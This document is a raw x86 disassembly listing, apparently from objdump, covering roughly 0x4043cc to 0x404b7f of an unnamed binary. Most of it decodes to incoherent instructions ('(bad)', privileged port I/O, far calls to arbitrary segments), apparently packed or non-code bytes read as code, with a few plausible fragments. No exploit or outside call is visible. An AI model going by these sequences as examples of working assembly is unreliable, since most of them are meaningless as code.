  4043cc:	cmp    BYTE PTR [esp+ebp*4-0x32f3c91],0x79
  4043d4:	imul   ecx,DWORD PTR [edi-0x7d],0xffffff8c
  4043d8:	repnz dec esp
  4043da:	jl     0x404405
  4043dc:	pop    ss
  4043dd:	cmp    BYTE PTR [eax+0x69],dh
  4043e0:	daa    
  4043e1:	jle    0x4043d2
  4043e3:	cmc    
  4043e4:	xor    BYTE PTR [edx+0x45],al
  4043e7:	mov    DWORD PTR [edx],edx
  4043e9:	js     0x4043c9
  4043eb:	mov    bh,0xf0
  4043ed:	jp     0x4043f5
  4043ef:	add    eax,DWORD PTR [ebp-0x53]
  4043f2:	add    edi,eax
  4043f4:	scas   al,BYTE PTR es:[edi]
  4043f5:	xchg   BYTE PTR [ebx+0x70],dl
  4043f8:	aam    0x9
  4043fa:	retf   
  4043fb:	mov    edi,0x29e50668
  404400:	btr    DWORD PTR cs:[edi],esp
  404404:	push   ebp
  404405:	pop    ebp
  404406:	outs   dx,DWORD PTR ds:[esi]
  404407:	push   ebx
  404408:	push   ds
  404409:	mov    ah,0x1c
  40440b:	jp     0x4043d9
  40440d:	and    esi,esp
  40440f:	add    edi,DWORD PTR [edx]
  404411:	push   0x2c
  404413:	adc    DWORD PTR [edx-0x16],ecx
  404416:	loopne 0x404430
  404418:	inc    edx
  404419:	adc    BYTE PTR [ebx],0x86
  40441c:	pop    ecx
  40441d:	fistp  DWORD PTR [ebx]
  40441f:	mov    dh,0x7d
  404421:	push   es
  404422:	in     eax,dx
  404423:	sbb    esp,0x4d
  404426:	inc    esi
  404427:	mov    eax,ds:0xf54b6fbd
  40442c:	jae    0x4044aa
  40442e:	xlat   BYTE PTR ds:[ebx]
  40442f:	popa   
  404430:	inc    edx
  404431:	mov    dh,BYTE PTR ds:0x5ab3ad43
  404437:	inc    esi
  404438:	repz in eax,0x4c
  40443b:	jg     0x4043c8
  40443d:	sbb    BYTE PTR [edx-0x38],0x59
  404441:	fcomp  st(2)
  404443:	adc    BYTE PTR [ecx+ecx*1],ah
  404446:	mov    ebx,es
  404448:	mov    edi,0x34d85d1f
  40444d:	xor    al,0xe7
  40444f:	inc    edx
  404450:	aaa    
  404451:	fisubr DWORD PTR [edx+0x563c22fe]
  404457:	fcomp  QWORD PTR [ebp+edx*2+0x660c7ac0]
  40445e:	retf   
  40445f:	das    
  404460:	push   edi
  404461:	push   0x76
  404463:	adc    ebx,ecx
  404465:	push   esi
  404466:	outs   dx,BYTE PTR ds:[esi]
  404467:	test   eax,ebp
  404469:	dec    edi
  40446a:	adc    BYTE PTR [edx],ah
  40446c:	mov    ebp,0x3b3b9a7c
  404471:	mov    dh,0xb6
  404473:	and    ecx,ebx
  404475:	dec    esi
  404476:	rcr    ebp,cl
  404478:	xor    eax,0x7e86826f
  40447d:	cmc    
  40447e:	dec    edi
  40447f:	mov    ebp,0xcbb327e9
  404484:	ins    DWORD PTR es:[edi],dx
  404485:	or     al,0x6a
  404487:	dec    edi
  404488:	jl     0x2dfc5958
  40448e:	mov    ebx,0x6891bb44
  404493:	or     eax,0x17892a48
  404498:	cmp    DWORD PTR [ebx+ebx*4],edx
  40449b:	pop    es
  40449c:	sub    bh,BYTE PTR [esi]
  40449e:	cmovle ecx,DWORD PTR [esi+eax*1+0x118e71fb]
  4044a6:	out    0x28,al
  4044a8:	mov    dh,0x7d
  4044aa:	aaa    
  4044ab:	pushf  
  4044ac:	fimul  DWORD PTR [esi-0x4cd4788a]
  4044b2:	out    0xbb,al
  4044b4:	add    al,0xbe
  4044b6:	ds call 0xa02b4f04
  4044bc:	lods   eax,DWORD PTR ds:[esi]
  4044bd:	das    
  4044be:	shr    DWORD PTR [eax+0x16595b28],1
  4044c4:	mov    ebp,0x2b06ad8
  4044c9:	sub    al,0x55
  4044cb:	push   esi
  4044cc:	jp     0x4044e7
  4044ce:	sub    DWORD PTR [edx],ecx
  4044d0:	(bad)  
  4044d1:	xor    edi,esi
  4044d3:	inc    eax
  4044d4:	jbe    0x40453c
  4044d6:	ror    ebx,cl
  4044d8:	outs   dx,DWORD PTR ds:[esi]
  4044d9:	daa    
  4044da:	mov    esi,0xb5a454f3
  4044df:	jae    0x4044f9
  4044e1:	es pop edi
  4044e3:	into   
  4044e4:	imul   ebp,DWORD PTR [ecx-0x44453cb1],0x5b
  4044eb:	mov    ah,0xf1
  4044ed:	pusha  
  4044ee:	mov    dl,0xad
  4044f0:	jmp    0x4044cc
  4044f2:	sub    DWORD PTR [edx],esp
  4044f4:	pop    esi
  4044f5:	retf   0xea61
  4044f8:	scas   eax,DWORD PTR es:[edi]
  4044f9:	call   0xb88:0x2ff37717
  404500:	clc    
  404501:	inc    edx
  404502:	test   al,0xb4
  404504:	int3   
  404505:	call   0x7b7d16fa
  40450a:	jle    0x4044b0
  40450c:	cld    
  40450d:	iret   
  40450e:	gs (bad) 
  404510:	xlat   BYTE PTR ds:[ebx]
  404511:	(bad)  
  404513:	and    eax,0x3ae8b745
  404518:	rcl    DWORD PTR [ebx-0x7c],1
  40451b:	push   cs
  40451c:	xor    bh,BYTE PTR [esi+eax*4+0x4da16ede]
  404523:	jbe    0x4044ec
  404525:	mov    esp,0xfb0dee3
  40452a:	leave  
  40452b:	nop
  40452c:	fisubr DWORD PTR [edx+0x2b91c4f]
  404532:	(bad)
  404536:	adc    BYTE PTR [edx-0x6c],bh
  404539:	xor    cl,BYTE PTR [ebx+ebx*4-0x14f79a00]
  404540:	fiadd  DWORD PTR [edx-0x2d]
  404543:	out    dx,eax
  404544:	xchg   edi,eax
  404545:	loop   0x404566
  404547:	ss lahf 
  404549:	xor    edx,esp
  40454b:	xchg   ebx,eax
  40454c:	dec    esp
  40454d:	enter  0xd8f2,0x9e
  404551:	lods   eax,DWORD PTR ds:[esi]
  404552:	jmp    0x404503
  404554:	repnz adc BYTE PTR [edx+ebx*1-0x3e473699],ch
  40455c:	test   DWORD PTR [ebp-0x1a15ec7a],0xec5aaf9d
  404566:	out    0x94,al
  404568:	jo     0x404599
  40456a:	call   0xb529bcef
  40456f:	mov    bl,al
  404571:	jl     0x4045cf
  404573:	outs   dx,BYTE PTR ds:[esi]
  404574:	sar    DWORD PTR [esi-0x536b0a82],1
  40457a:	in     eax,0x6c
  40457c:	mov    eax,ds:0x4d8a84dd
  404581:	rol    DWORD PTR [edi+0x36],1
  404584:	pusha  
  404585:	fdivp  st(0),st
  404587:	lahf   
  404588:	mov    ds:0x6ef65c2b,al
  40458d:	cmc    
  40458e:	into   
  40458f:	vmread edi,ebx
  404592:	sbb    DWORD PTR [ecx+0x21],esi
  404595:	jne    0x404567
  404597:	adc    al,0x5c
  404599:	test   DWORD PTR [eax+0x18cc94b2],eax
  40459f:	jmp    0x404560
  4045a1:	les    edx,FWORD PTR [eax]
  4045a3:	shl    DWORD PTR ds:0x67a6c5b5,0xe9
  4045aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045ab:	int    0xde
  4045ad:	add    esi,esp
  4045af:	dec    edi
  4045b0:	fiadd  DWORD PTR ds:0x8a266542
  4045b6:	pushf  
  4045b7:	mov    ah,0xc3
  4045b9:	repnz push eax
  4045bb:	repnz xor ebp,DWORD PTR [esi]
  4045be:	and    eax,0xafe03003
  4045c3:	icebp  
  4045c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c5:	stc    
  4045c6:	xchg   esi,eax
  4045c7:	sbb    al,0x4e
  4045c9:	jb     0x4045f6
  4045cb:	pop    ebp
  4045cc:	xlat   BYTE PTR ds:[ebx]
  4045cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ce:	xchg   esp,eax
  4045cf:	jl     0x404649
  4045d1:	loopne 0x404627
  4045d3:	cld    
  4045d4:	cs aaa 
  4045d6:	mov    ebx,0x4f700ead
  4045db:	xchg   dl,dh
  4045dd:	cmp    cl,al
  4045df:	cmp    DWORD PTR [esi+0x2f],edx
  4045e2:	jecxz  0x4045ea
  4045e4:	adc    dh,BYTE PTR [esi+0x4f86d41]
  4045ea:	add    BYTE PTR [ecx+0x4f],ch
  4045ed:	sub    BYTE PTR [ebp+ebx*8+0x40],dh
  4045f1:	mov    al,0xb0
  4045f3:	fst    DWORD PTR [ecx]
  4045f5:	sub    BYTE PTR [esp+ebx*8],al
  4045f8:	call   0x612e:0xaedf4dc1
  4045ff:	jns    0x40465e
  404601:	cmp    eax,DWORD PTR [ecx+0x1e]
  404604:	fisttp QWORD PTR [ecx-0x3f]
  404607:	arpl   WORD PTR [esi-0x6a316433],bp
  40460d:	dec    esp
  40460e:	xor    edi,ebx
  404610:	loopne 0x4045b8
  404612:	jge    0x404659
  404614:	call   FWORD PTR [esi]
  404616:	ficom  DWORD PTR [eax+0x0]
  404619:	stos   DWORD PTR es:[edi],eax
  40461a:	adc    al,0xef
  40461c:	xor    eax,0x8f791a2c
  404621:	(bad)  
  404623:	pop    ebp
  404624:	jae    0x4045be
  404626:	(bad)  
  404627:	adc    al,0x16
  404629:	mov    dl,0x35
  40462b:	cld    
  40462c:	(bad)  
  40462d:	pop    ebx
  40462e:	hlt    
  40462f:	ror    BYTE PTR [edx+0x536f9cd2],1
  404635:	or     eax,0x7e7fbc65
  40463a:	push   edx
  40463b:	ds (bad) 
  40463e:	inc    esp
  40463f:	and    al,bl
  404641:	popf   
  404642:	and    BYTE PTR [ebx+0x1c],al
  404645:	pop    edi
  404646:	or     esi,esi
  404648:	sbb    DWORD PTR [esi],edi
  40464a:	xchg   edx,eax
  40464b:	lds    edx,FWORD PTR [eax]
  40464d:	pop    fs
  40464f:	lahf   
  404650:	jns    0x404690
  404652:	push   0xa615677a
  404657:	jecxz  0x404672
  404659:	pop    edi
  40465a:	cmp    BYTE PTR [eax+0x12],0x7f
  40465e:	add    al,cl
  404660:	push   esp
  404661:	fidivr DWORD PTR [edi]
  404663:	or     BYTE PTR [ecx],ch
  404665:	or     al,0x9d
  404667:	pop    ss
  404668:	data16 ja 0x40469a
  40466b:	loopne 0x40465a
  40466d:	ret    0xb2e4
  404670:	shl    BYTE PTR [edi],0x5f
  404673:	rcl    BYTE PTR [edx-0x783a332c],0x9f
  40467a:	call   0xfc1f:0x591e5690
  404681:	sub    DWORD PTR [edi],ecx
  404683:	jbe    0x4046a6
  404685:	int3   
  404686:	jne    0x404625
  404688:	inc    edx
  404689:	(bad)  
  40468a:	cmp    eax,0x6c7b081e
  40468f:	inc    ebx
  404690:	add    al,0x80
  404692:	arpl   WORD PTR [eax-0x289f2cce],di
  404698:	push   ss
  404699:	pop    ebx
  40469a:	dec    ebx
  40469b:	outs   dx,BYTE PTR ds:[esi]
  40469c:	lds    ebp,FWORD PTR [edx+0x40]
  40469f:	mov    edi,0x3555c4f4
  4046a4:	out    0x99,eax
  4046a6:	xchg   ebx,eax
  4046a7:	repnz or DWORD PTR [edi-0x34],edx
  4046ab:	dec    edx
  4046ac:	lea    ebx,[edx]
  4046ae:	(bad)  
  4046b0:	mov    eax,0x167282d0
  4046b5:	xor    DWORD PTR [ebx+0x28],ebx
  4046b8:	jne    0x4046e6
  4046ba:	dec    edx
  4046bb:	jns    0x404720
  4046bd:	mov    ebp,0x1cd4647d
  4046c2:	bound  ecx,QWORD PTR [ecx]
  4046c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c5:	aam    0xea
  4046c7:	jmp    0x404711
  4046c9:	inc    edi
  4046ca:	divps  xmm0,XMMWORD PTR [edx-0x3f]
  4046ce:	test   eax,0xe2c926bf
  4046d3:	cs add al,0x1b
  4046d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d7:	js     0x4046b6
  4046d9:	push   ds
  4046da:	out    0xab,eax
  4046dc:	dec    ecx
  4046dd:	ror    ebx,cl
  4046df:	mov    dl,0x96
  4046e1:	inc    edi
  4046e2:	sbb    eax,0x68692da2
  4046e7:	repz popa 
  4046e9:	mov    ss,WORD PTR [eax+0x794dedea]
  4046ef:	cmp    al,BYTE PTR ds:0x154ed52c
  4046f5:	sbb    al,0x85
  4046f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f8:	loop   0x40467d
  4046fa:	aam    0x9d
  4046fc:	inc    ecx
  4046fd:	push   edx
  4046fe:	popf   
  4046ff:	fcomp  st(3)
  404701:	or     BYTE PTR [ebx],al
  404703:	adc    BYTE PTR [esi],dh
  404705:	fisubr WORD PTR [esi+0x20]
  404708:	dec    esi
  404709:	jmp    0xba0bec8d
  40470e:	adc    al,0x6b
  404710:	mov    bh,0xb
  404712:	shr    DWORD PTR [ebx+0x51],1
  404715:	scas   al,BYTE PTR es:[edi]
  404716:	pop    ds
  404717:	outs   dx,BYTE PTR ds:[esi]
  404718:	test   eax,0xdc6ac34
  40471d:	jge    0x404769
  40471f:	push   0xe30e624
  404724:	sbb    ecx,DWORD PTR ds:0xcd83a7b1
  40472a:	adc    BYTE PTR [edx],dl
  40472c:	es and al,0x3b
  40472f:	fimul  DWORD PTR ds:0xabf323ba
  404735:	pop    edi
  404736:	in     eax,dx
  404737:	jmp    0xab87a063
  40473c:	shrd   ecx,edx,0x2
  404740:	or     DWORD PTR ds:0x4282e3,0x42829f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x4282bf
  404753:	or     DWORD PTR ds:0x4283bf,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xbefa0ff8
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax+0x5],al
  40477b:	test   eax,0x3d04fef8
  404780:	xchg   edi,eax
  404781:	mov    BYTE PTR [ebp-0x38],ch
  404784:	push   ebx
  404785:	cmp    DWORD PTR [edi+0x407b941],0x6a7bc7ad
  40478f:	cmp    BYTE PTR [edi],ch
  404791:	adc    eax,edx
  404793:	sbb    BYTE PTR [edx],0x8f
  404796:	sbb    dh,al
  404798:	sub    DWORD PTR [ebx-0x4d],edx
  40479b:	pop    ecx
  40479c:	mov    eax,ds:0x6e9f113c
  4047a1:	mov    ecx,0xaa96ed58
  4047a6:	sub    eax,ebx
  4047a8:	sub    edi,DWORD PTR [edx]
  4047aa:	pop    ecx
  4047ab:	pop    edx
  4047ac:	pusha  
  4047ad:	inc    edx
  4047ae:	inc    esp
  4047af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047b0:	hlt    
  4047b1:	pop    esi
  4047b2:	or     al,0xb4
  4047b4:	or     ebp,esi
  4047b6:	ret    0x2c53
  4047b9:	cs mov edx,0x957a7953
  4047bf:	shl    eax,1
  4047c1:	adc    eax,0x9aaa9a95
  4047c6:	dec    esp
  4047c7:	gs retf 
  4047c9:	test   DWORD PTR [eax+0x9],edi
  4047cc:	nop
  4047cd:	in     eax,0x42
  4047cf:	sbb    dh,al
  4047d1:	stos   DWORD PTR es:[edi],eax
  4047d2:	add    DWORD PTR [esi+0x2],esi
  4047d5:	clc    
  4047d6:	sbb    eax,0xe1c3b495
  4047db:	mov    esp,0xe20e9e08
  4047e0:	jmp    0xb180f76d
  4047e5:	push   ss
  4047e6:	mov    esi,0xb5294e96
  4047eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ec:	je     0x40482e
  4047ee:	mov    edx,0xcbc277d5
  4047f3:	jmp    FWORD PTR [esi]
  4047f5:	repz arpl WORD PTR [ecx],bp
  4047f8:	scas   al,BYTE PTR es:[edi]
  4047f9:	xchg   ebx,eax
  4047fa:	hlt    
  4047fb:	jl     0x404781
  4047fd:	loope  0x40481d
  4047ff:	dec    esp
  404800:	retf   
  404801:	cmp    ecx,DWORD PTR [edi]
  404803:	or     cl,BYTE PTR [edi-0x3e64ac6c]
  404809:	pop    eax
  40480a:	jmp    0xd405:0x2b70dccd
  404811:	adc    BYTE PTR [esi],ch
  404813:	pop    ss
  404814:	cmp    al,0xef
  404816:	push   edx
  404817:	and    edx,DWORD PTR [ecx-0x6e]
  40481a:	push   esp
  40481b:	cdq    
  40481c:	arpl   WORD PTR [ebx+0x52],ax
  40481f:	mov    eax,0x3c9de9de
  404824:	dec    ecx
  404825:	inc    esi
  404826:	sbb    ecx,DWORD PTR fs:[edi+0x70]
  40482a:	pop    edi
  40482b:	mov    cl,0x20
  40482d:	xchg   ecx,eax
  40482e:	cmp    ebx,ecx
  404830:	fs (bad) 
  404832:	ficomp DWORD PTR [edx]
  404834:	and    ecx,DWORD PTR ds:0x658e0e81
  40483a:	stos   DWORD PTR es:[edi],eax
  40483b:	popf   
  40483c:	in     eax,dx
  40483d:	jno    0x404895
  40483f:	push   edx
  404840:	jo     0x404800
  404842:	bound  eax,QWORD PTR [ecx-0x74]
  404845:	dec    edx
  404846:	jle    0x4048b8
  404848:	mov    ch,0xeb
  40484a:	xchg   DWORD PTR [ebx-0x19dd5d88],ebp
  404850:	inc    ebp
  404851:	mov    ds:0x5f73d947,eax
  404856:	adc    al,0xd7
  404858:	stos   BYTE PTR es:[edi],al
  404859:	aad    0xca
  40485b:	cmc    
  40485c:	sub    ebx,ecx
  40485e:	iret   
  40485f:	mov    ch,0x5c
  404861:	pushf  
  404862:	sub    DWORD PTR [ebx-0x14a0bb86],ebx
  404868:	(bad)  
  404869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40486a:	xor    DWORD PTR ds:0x157cda9f,ecx
  404870:	xchg   ebx,eax
  404871:	lods   al,BYTE PTR ds:[esi]
  404872:	leave  
  404873:	shl    BYTE PTR [edi],cl
  404875:	lods   eax,DWORD PTR ds:[esi]
  404876:	sub    eax,0x7794ef3
  40487b:	lods   eax,DWORD PTR ds:[esi]
  40487c:	xchg   ebx,eax
  40487d:	dec    dh
  40487f:	cmp    BYTE PTR [esi+edx*2],cl
  404882:	cli    
  404883:	or     cl,al
  404885:	pop    ecx
  404886:	es out dx,eax
  404888:	call   0x30d59374
  40488d:	sbb    bh,0x16
  404890:	and    eax,0x2ebf5d85
  404895:	cli    
  404896:	push   ebx
  404897:	out    0x93,eax
  404899:	mov    al,0xbb
  40489b:	mov    esi,0xc7726cee
  4048a0:	clc    
  4048a1:	mov    WORD PTR [eax-0x43383bee],cs
  4048a7:	hlt    
  4048a8:	xor    eax,0x98008b73
  4048ad:	mov    ebp,esi
  4048af:	imul   edx,esi,0xffffffb7
  4048b2:	jo     0x4048b2
  4048b4:	shl    BYTE PTR [eax+0x40],cl
  4048b7:	mov    ecx,0x5489c024
  4048bc:	ins    BYTE PTR es:[edi],dx
  4048bd:	jno    0x404928
  4048bf:	inc    edi
  4048c0:	sbb    BYTE PTR [edx-0x38ac5dbd],ah
  4048c6:	lea    ebp,[esi+eiz*1+0x7c]
  4048ca:	mov    ebp,0xf605817c
  4048cf:	and    BYTE PTR [eax],bh
  4048d1:	push   ecx
  4048d2:	test   DWORD PTR [ebx+0x6a],esi
  4048d5:	test   al,0x7b
  4048d7:	push   esp
  4048d8:	into   
  4048d9:	push   edx
  4048da:	stos   BYTE PTR es:[edi],al
  4048db:	jae    0x4048f1
  4048dd:	and    BYTE PTR [edx+0x48f185ba],bh
  4048e3:	xor    DWORD PTR [edi+eax*1-0x6862c219],edx
  4048ea:	ror    BYTE PTR [ebp+0x53],1
  4048ed:	inc    ecx
  4048ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ef:	jmp    DWORD PTR [ecx+0x6e]
  4048f2:	scas   al,BYTE PTR es:[edi]
  4048f3:	popa   
  4048f4:	cwde   
  4048f5:	or     al,0x78
  4048f7:	stos   BYTE PTR es:[edi],al
  4048f8:	mov    cl,0x3a
  4048fa:	lss    ebp,FWORD PTR [esi-0x41d2ec04]
  404901:	adc    DWORD PTR [edi-0xac26af1],edi
  404907:	inc    esp
  404908:	pop    ss
  404909:	xchg   ecx,eax
  40490a:	repz pop di
  40490d:	sbb    eax,0xa9204d25
  404912:	push   ss
  404913:	cwde   
  404914:	rcl    esi,0x21
  404917:	mov    cl,0x6b
  404919:	xchg   DWORD PTR gs:[ebx+edx*2],ebx
  40491d:	and    bl,BYTE PTR [ecx]
  40491f:	add    ecx,DWORD PTR [edx]
  404921:	mov    BYTE PTR ds:0x4b69d082,ah
  404927:	cmp    cl,ch
  404929:	ja     0x404998
  40492b:	add    DWORD PTR [edx+0x7d361217],edx
  404931:	jnp    0x40497a
  404933:	ror    DWORD PTR [edi-0x3f],cl
  404936:	imul   esp,DWORD PTR [edx-0x406393f7],0xffffffca
  40493d:	push   edx
  40493e:	icebp  
  40493f:	or     DWORD PTR [ecx+0x739bfdf2],ebp
  404945:	mov    bl,0x63
  404947:	nop
  404948:	es leave 
  40494a:	cmp    al,0xf7
  40494c:	cmp    edx,ebx
  40494e:	push   esi
  40494f:	sub    eax,0x7de73b6a
  404954:	dec    edx
  404955:	fldenv [ebx-0x5ae3df81]
  40495b:	push   esp
  40495c:	das    
  40495d:	lds    esi,FWORD PTR [edi-0x260057df]
  404963:	dec    ebx
  404964:	mov    eax,ds:0xec457a5f
  404969:	test   al,0x9c
  40496b:	ss adc al,0x34
  40496e:	imul   ebp,esp,0x4e
  404971:	push   cs
  404972:	dec    eax
  404973:	lods   al,BYTE PTR ds:[esi]
  404974:	(bad)  
  404975:	addr16 add eax,0x9767abe1
  40497b:	aaa    
  40497c:	jecxz  0x40492c
  40497e:	bound  esi,QWORD PTR [edi]
  404980:	push   0xf60a886d
  404985:	test   eax,0x76484c6f
  40498a:	mov    dl,BYTE PTR [esi-0x38]
  40498d:	cdq    
  40498e:	sbb    al,0x32
  404990:	sub    cl,bl
  404992:	mov    ebx,DWORD PTR [esi]
  404994:	mov    ebx,esi
  404996:	aam    0xe7
  404998:	push   ds
  404999:	mov    edi,edi
  40499b:	aad    0xa0
  40499d:	mov    bh,0x3d
  40499f:	inc    esi
  4049a0:	mov    cl,0xe1
  4049a2:	push   esi
  4049a3:	pushf  
  4049a4:	loop   0x404945
  4049a6:	mov    al,BYTE PTR [edi+eiz*2]
  4049a9:	and    eax,DWORD PTR [ebx]
  4049ab:	int3   
  4049ac:	cmp    DWORD PTR [esi-0x8],edi
  4049af:	xor    ecx,DWORD PTR [edx+ebp*8-0x54]
  4049b3:	add    esp,DWORD PTR [esi]
  4049b5:	adc    esi,esi
  4049b7:	inc    esi
  4049b8:	shr    BYTE PTR [ecx+0x6d],0xff
  4049bc:	ins    DWORD PTR es:[edi],dx
  4049bd:	mov    WORD PTR [esi],ds
  4049bf:	popa   
  4049c0:	retf   
  4049c1:	leave  
  4049c2:	cmp    BYTE PTR [esi+0x51],0x97
  4049c6:	mov    dl,0x96
  4049c8:	push   esi
  4049c9:	mov    ch,dl
  4049cb:	(bad)  
  4049cc:	sub    DWORD PTR [edx+0x10],0x7ce99d8a
  4049d3:	xchg   edx,eax
  4049d4:	pop    esi
  4049d5:	(bad)  
  4049d6:	adc    al,0xb1
  4049d8:	push   esp
  4049d9:	jecxz  0x4049b9
  4049db:	dec    ebp
  4049dc:	mov    ss,WORD PTR [ebx*8+0x2e343a18]
  4049e3:	nop
  4049e4:	dec    edx
  4049e5:	daa    
  4049e6:	scas   eax,DWORD PTR es:[edi]
  4049e7:	fcomp  DWORD PTR [edi+0x40d21f4]
  4049ed:	mov    ebp,0x1ca18a98
  4049f2:	retf   
  4049f3:	div    DWORD PTR [ecx+0x46eb8750]
  4049f9:	fwait
  4049fa:	in     al,0x47
  4049fc:	jb     0x4049f7
  4049fe:	inc    ebx
  4049ff:	pop    esp
  404a00:	and    al,0x5a
  404a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a03:	outs   dx,BYTE PTR ds:[esi]
  404a04:	mov    cl,0x7e
  404a06:	std    
  404a07:	sub    eax,0x4a324537
  404a0c:	dec    edx
  404a0d:	add    edi,DWORD PTR [ebp-0x6ed13583]
  404a13:	(bad)  
  404a14:	imul   ebx,edx,0xffffffc9
  404a17:	inc    ecx
  404a18:	in     eax,0xd1
  404a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1b:	or     BYTE PTR [ebx-0x7a],al
  404a1e:	xchg   esi,eax
  404a1f:	cld    
  404a20:	dec    esp
  404a21:	outs   dx,DWORD PTR ds:[esi]
  404a22:	jo     0x404a48
  404a24:	jg     0x404a40
  404a26:	jecxz  0x404a24
  404a28:	das    
  404a29:	sub    BYTE PTR [esp+ecx*8+0x1c],dh
  404a2d:	pop    edi
  404a2e:	(bad)  
  404a2f:	fcomp  QWORD PTR [eax]
  404a31:	aam    0xed
  404a33:	hlt    
  404a34:	addr16 ss (bad) 
  404a37:	mov    db5,edx
  404a3a:	fs pop esp
  404a3c:	sbb    ebp,DWORD PTR [ecx]
  404a3e:	mov    ?,WORD PTR [ebx+0x4339175c]
  404a44:	shl    BYTE PTR [edx+0xfc25d67],1
  404a4a:	ins    DWORD PTR es:[edi],dx
  404a4b:	jno    0x404abf
  404a4d:	pop    esi
  404a4e:	pop    edx
  404a4f:	imul   ecx,eax,0xdeccb27a
  404a55:	mov    ds:0xb8047d72,al
  404a5a:	mov    ch,bl
  404a5c:	js     0x404a74
  404a5e:	dec    eax
  404a5f:	and    BYTE PTR [esi-0x4f349c7a],bl
  404a65:	into   
  404a66:	je     0x404acc
  404a68:	ins    BYTE PTR es:[edi],dx
  404a69:	jnp    0x404a79
  404a6b:	xlat   BYTE PTR ds:[ebx]
  404a6c:	inc    eax
  404a6d:	jb     0x404aaa
  404a6f:	xor    BYTE PTR [edi],dl
  404a71:	clc    
  404a72:	push   esp
  404a73:	dec    esp
  404a74:	xlat   BYTE PTR ds:[ebx]
  404a75:	adc    DWORD PTR [eax+edx*2-0x17],edi
  404a79:	retf   0xb5c9
  404a7c:	mov    bl,0xf3
  404a7e:	push   ss
  404a7f:	pop    edx
  404a80:	call   0x7295b179
  404a85:	es aad 0x13
  404a88:	gs (bad) 
  404a8a:	xchg   edx,eax
  404a8b:	inc    ebx
  404a8c:	(bad)  
  404a8d:	shl    al,1
  404a8f:	int3   
  404a90:	pop    eax
  404a91:	jp     0x404a7a
  404a93:	je     0x404a38
  404a95:	fstp   TBYTE PTR ds:0x27bbb76e
  404a9b:	(bad)  
  404a9d:	sub    BYTE PTR [ebx-0x36],0xf9
  404aa1:	imul   esi,DWORD PTR [esi-0x2],0xffffff92
  404aa5:	mov    ?,esp
  404aa7:	jmp    0x404aa6
  404aa9:	pop    es
  404aaa:	lahf   
  404aab:	sbb    BYTE PTR [edx+0x48],cl
  404aae:	sahf   
  404aaf:	dec    ebp
  404ab0:	hlt    
  404ab1:	retf   0xba7b
  404ab4:	mov    esp,0xbd07970d
  404ab9:	mov    bl,0xfb
  404abb:	js     0x404a80
  404abd:	sbb    BYTE PTR [ebx-0x66ecb08f],ah
  404ac3:	adc    DWORD PTR [ebp-0x53],0xc221291c
  404aca:	std    
  404acb:	cld    
  404acc:	jae    0x404a58
  404ace:	fld    TBYTE PTR [ebp+0x62]
  404ad1:	jp     0x404adc
  404ad3:	(bad)  
  404ad5:	sbb    BYTE PTR [ebx-0x40e4712],0x81
  404adc:	xchg   esi,eax
  404add:	fs jl  0x404af2
  404ae0:	ret    0x38f
  404ae3:	imul   esp,DWORD PTR [eax-0x394e5e86],0x51
  404aea:	mov    edx,0xa1bfee3d
  404aef:	cli    
  404af0:	mov    bh,0x2
  404af2:	std    
  404af3:	pop    ebx
  404af4:	xchg   edi,edi
  404af6:	ret    
  404af7:	int3   
  404af8:	add    BYTE PTR [ebx-0x23],0xff
  404afc:	dec    edx
  404afd:	jns    0x404b16
  404aff:	call   0x6ff3a258
  404b04:	jp     0x404b6b
  404b06:	outs   dx,BYTE PTR ds:[esi]
  404b07:	jnp    0x404b87
  404b09:	call   0xd3e36745
  404b0e:	jecxz  0x404b33
  404b10:	mov    eax,ds:0xa4179f88
  404b15:	mov    WORD PTR [ebp+0x47],fs
  404b18:	sub    al,0xcc
  404b1a:	mov    esi,0xfd50d2db
  404b1f:	push   es
  404b20:	xchg   esp,eax
  404b21:	jmp    DWORD PTR [edi+0x33604dd0]
  404b27:	jecxz  0x404b1d
  404b29:	std    
  404b2a:	gs cs push cs
  404b2d:	(bad)  
  404b2e:	call   0x4750be90
  404b33:	fwait
  404b34:	push   esp
  404b35:	jmp    0x404b1f
  404b37:	or     eax,0xb8b3546
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x4282d3,0x428347
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	adc    edi,DWORD PTR [ecx-0x33]
  404b62:	jo     0x404bc4
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    dh,dl
  404b6c:	pusha  
  404b6d:	fidiv  DWORD PTR [eax]
  404b6f:	setl   bl
  404b72:	or     esp,DWORD PTR [ecx]
  404b74:	inc    eax
  404b75:	out    0x1a,eax
  404b77:	lods   eax,DWORD PTR ds:[esi]
  404b78:	ror    esi,cl
  404b7a:	das    
  404b7b:	and    DWORD PTR [esi],esp
  404b7d:	jmp    esp
  404b7f:	xor    ah,ch
